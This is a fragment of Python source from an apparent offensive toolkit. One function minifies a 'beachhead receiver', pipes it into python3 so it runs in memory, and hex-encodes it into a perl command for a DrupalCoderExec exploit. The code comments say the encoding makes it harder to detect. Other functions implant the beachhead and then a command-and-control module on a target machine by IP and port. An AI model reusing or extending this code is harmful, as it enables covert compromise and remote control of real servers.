...
def package_beachhead():
    """Packages the beachhead receiver into a perl command that can be implanted by the DrupalCoderExec exploit

    This function will read the beachhead receiver from its file, minify it, put it in a format that will let it
    be piped directly into a python3 interpreter, and then package it into a perl command that can be implanted
    by the DrupalCoderExec exploit.
    """

    with open(BEACHHEAD_LOCATION, 'r') as f:

        # The minifier will remove all comments and whitespace from the file, as well as make other optimizations
        receiver = python_minifier.minify(f.read())

    # Echoing the receiver into a python interpreter will run it in memory and not write unnecessary files to disk
    receiver = 'echo "' + receiver + '" | python3'

    # Covert the receiver to hex to make it harder to detect and less likely to run into issues with special characters
    hex_beachhead = binascii.hexlify(receiver.encode('utf-8')).decode('utf-8') 

    # Use the perl pack function to convert the hex back into a string and run it as a shell command
...
def implant_beachhead(ip_addr, port, path):
    ...
    This function will use the DrupalCoderExec class to implant the beachhead receiver into the target machine.
...
def implant_cnc(ip_addr, port, path, implant_file_path):
    ...
    This function will use the BeachheadSender class to implant the Command and Control module receiver into the target machine.
    See that class for further documentation.
    """
